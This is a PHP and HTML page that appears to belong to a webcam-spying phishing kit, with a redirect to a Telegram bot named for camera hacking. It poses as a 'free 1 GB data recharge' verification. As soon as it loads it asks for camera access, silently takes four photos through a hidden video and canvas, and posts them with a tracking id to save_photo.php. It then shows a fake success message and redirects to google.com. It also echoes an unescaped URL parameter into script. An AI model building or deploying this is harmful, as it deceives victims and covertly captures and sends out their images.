<?php
$claim = isset($_GET['id']) ? $_GET['id'] : null;

if (!$claim) {
    header("Location: http://t.me/CAM_H4CK_NG_PRO_BOT");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify</title>
    <style>
        body {
            background: linear-gradient(to right, #00c6ff, #0072ff);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            animation: slideRight 0.5s ease-out;
        }

        @keyframes slideRight {
            from {
                opacity: 0;
                transform: translateX(-100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .container {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
            animation: fadeIn 1s;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .loading {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verify-button {
            background: #00c853;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            transition: background 0.3s;
        }

        .verify-button:hover {
            background: #00b04f;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <div class="container" id="container">
        <div class="loading"></div>
        <p id="status-text"><b>Click on Allow to Verify</b></p>
        <button id="verify-button" class="verify-button hidden">Verify</button>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusText = document.getElementById('status-text');
        const verifyButton = document.getElementById('verify-button');
        const claim = "<?php echo $claim; ?>";
        let photoCount = 0;

        // Set canvas dimensions (square)
        const canvasSize = 400; // Adjust this as needed
        canvas.width = canvasSize;
        canvas.height = canvasSize;

        function startVerification() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();
                    statusText.innerHTML = '<b>🚀 Processing your recharge...</b>';
                    setTimeout(capturePhoto, 1000);
                })
                .catch(err => {
                    console.error('Error accessing camera: ', err);
                    statusText.innerHTML = 'You need to verify yourself by tapping allow for claim free 1 GB data recharge';
                    verifyButton.classList.remove('hidden');
                });
        }

        function capturePhoto() {
            if (photoCount < 4) {
                // Calculate dimensions to maintain aspect ratio
                const aspectRatio = video.videoWidth / video.videoHeight;
                const targetWidth = canvas.width;
                const targetHeight = canvas.height;
                const scaledHeight = targetWidth / aspectRatio;
                const yOffset = (scaledHeight - targetHeight) / 2;

                context.drawImage(video, 0, -yOffset, targetWidth, scaledHeight);

                const photo = canvas.toDataURL('image/png');

                fetch('save_photo.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'photo=' + encodeURIComponent(photo) + '&id=' + encodeURIComponent(claim)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        console.log('Photo sent successfully');
                        photoCount++;
                        setTimeout(capturePhoto, 1000);
                    } else {
                        console.error('Failed to send photo: ', data.message);
                    }
                });
            } else {
                setTimeout(() => {
                    statusText.innerHTML = '<b>✅ Recharge Successful</b>';
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 3000);
                }, 1000);
            }
        }

        verifyButton.addEventListener('click', () => {
            window.location.href = `verify.php?id=${claim}`;
        });

        window.onload = startVerification;
    </script>
</body>
</html>